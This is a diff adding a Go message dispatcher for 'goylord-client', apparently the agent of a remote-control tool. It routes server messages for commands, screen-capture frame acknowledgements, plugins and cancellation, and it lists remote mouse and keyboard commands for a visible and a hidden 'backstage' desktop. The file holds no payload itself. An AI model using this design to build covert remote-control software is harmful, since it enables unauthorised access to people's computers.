@@ -1,0 +1,79 @@
+package handlers
+
+import (
+	"context"
+	"fmt"
+	"log"
+	"maps"
+
+	"goylord-client/cmd/agent/capture"
+	"goylord-client/cmd/agent/runtime"
+)
+
+type Dispatcher struct {
+	Env *runtime.Env
+}
+
+func NewDispatcher(env *runtime.Env) *Dispatcher {
+	return &Dispatcher{Env: env}
+}
+
+func (d *Dispatcher) Dispatch(ctx context.Context, envelope map[string]interface{}) (err error) {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("dispatcher: panic: %v", r)
+			err = fmt.Errorf("dispatcher panic: %v", r)
+		}
+	}()
+
+	msgType, ok := envelope["type"].(string)
+	if !ok || msgType == "" {
+		log.Printf("dispatcher: missing type (keys=%v)", maps.Keys(envelope))
+		return nil
+	}
+	switch msgType {
+	case "hello_ack":
+		return HandleHelloAck(ctx, d.Env, envelope)
+	case "ping":
+		return HandlePing(ctx, d.Env, envelope)
+	case "pong":
+		return HandlePong(ctx, d.Env, envelope)
+	case "frame_ack":
+		capture.ReleaseFrameSlot()
+		return nil
+	case "command":
+		cmdType, _ := envelope["commandType"].(string)
+		if !isInputCommand(cmdType) {
+			log.Printf("dispatcher: handling command type=%s", cmdType)
+		}
+		return HandleCommand(ctx, d.Env, envelope)
+	case "plugin_event":
+		return HandlePluginEvent(ctx, d.Env, envelope)
+	case "notification_config":
+		return HandleNotificationConfig(ctx, d.Env, envelope)
+	case "command_abort":
+		cmdID, _ := envelope["commandId"].(string)
+		if cmdID != "" {
+			if cancelCommand(cmdID) {
+				log.Printf("dispatcher: cancelled command %s", cmdID)
+			} else {
+				log.Printf("dispatcher: command %s not found or already completed", cmdID)
+			}
+		}
+		return nil
+	default:
+		log.Printf("dispatcher: unknown message type=%v", msgType)
+		return nil
+	}
+}
+
+func isInputCommand(cmdType string) bool {
+	switch cmdType {
+	case "desktop_mouse_move", "desktop_mouse_down", "desktop_mouse_up", "desktop_mouse_wheel",
+		"desktop_key_down", "desktop_key_up", "desktop_text",
+		"backstage_mouse_move", "backstage_mouse_down", "backstage_mouse_up",
+		"backstage_mouse_wheel", "backstage_key_down", "backstage_key_up":
+		return true
+	}
+	return false
+}
